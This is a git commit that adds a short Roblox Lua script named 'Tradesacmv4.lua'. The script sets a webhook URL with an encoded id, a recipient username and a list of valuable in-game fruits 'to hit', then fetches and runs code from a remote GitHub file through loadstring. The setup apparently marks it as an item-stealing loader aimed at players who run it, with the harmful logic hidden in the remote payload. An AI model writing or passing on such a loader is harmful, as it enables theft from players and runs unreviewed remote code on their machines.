adc02f8631ad61d9ffc4d761ccea1da2a3bf56fb
WAzurev99 <tuchhenlaxmisundar@gmail.com>
2025-03-22 19:06:32 +0545

    Create Tradesacmv4.lua

---
+++ Tradesacmv4.lua
@@ -0,0 +1,6 @@
+
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=NmJOTDVFanFYQkFINWxUZWhLSVBrZzo0b2RNeHk5Z1l6TjBWWjNSOXpILVpyLTQxbUFvTG5GUzZ3QldHS2tDUjI2QkJGMFBnNXFYNzVUWTNrUFA5TTdHVl9BcjBJaXAtZk9zRjR1U2FPRnpLc2gtN3pVNVhnOFhYRU92ZzhwVWY2RDNDUTFmVG1nZUZYeUpBNmt4c2sxZkwzRE9WZmV0Wm1TUkhnWGNZblljendRVy1uTFhsR0Uta19TWXN4YVF2YUk"
+Usernames = {"Hahagglol9"}
+FruitsToHit = {"Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune", "Gas-Gas"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
